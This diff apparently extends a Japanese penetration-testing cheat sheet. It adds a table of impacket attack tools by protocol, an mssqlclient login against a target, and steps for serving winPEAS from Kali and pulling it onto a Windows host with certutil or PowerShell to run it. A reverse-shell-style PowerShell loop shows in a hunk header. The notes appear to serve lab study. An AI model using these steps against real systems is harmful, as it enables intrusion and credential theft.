@@ -193,6 +193,20 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 ## 🔴tools
 
 ### impacket
+ネットワークプロトコル実装ツールキット
+```
+| プロトコル | 対応ツールの例                                                 |
+| --------- | ------------------------------------------------------------- |
+| SMB       | `smbclient.py`, `secretsdump.py`, `smbserver.py`, `psexec.py` |
+| RPC       | `rpcdump.py`, `atexec.py`, `samrdump.py`, `rpcmap.py`         |
+| LDAP      | `addcomputer.py`, `addspn.py`, `findDelegation.py`            |
+| Kerberos  | `ticketer.py`, `getTGT.py`, `getST.py`, `getnpusers.py`       |
+| MSSQL     | `mssqlclient.py`                                              |
+| WMI/DCOM  | `wmiexec.py`, `dcomexec.py`                                   |
+| HTTP/NTLM | `ntlmrelayx.py`                                               |
+| RDP       | `rdp_check.py`                                                |
+| SNMP      | `snmpquery.py`（※別途）                                       |
+```
 ```
 git clone https://github.com/fortra/impacket.git
 sudo python3 setup.py install
@@ -201,4 +215,17 @@ sudo python3 setup.py install
 MSSQL サーバ（TCP 1433）へログインして、SQL クエリを実行できるツール
 ```
 python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
+```
+### winPEAS
+
+#### 1. Kaliなどから Windows に winPEAS をアップロード
+```
+python3 -m http.server 80  # Kali側
+# Windows側で certutil または powershell wget で取得
+```
+#### 2. 実行（PowerShellまたはcmd）
+```
+winPEASx64.exe           ← 自動で幅広く調査
+winPEASx64.exe quiet     ← 非常に静かに実行（出力最小）
+winPEASx64.exe systeminfo userinfo servicesinfo
 ```
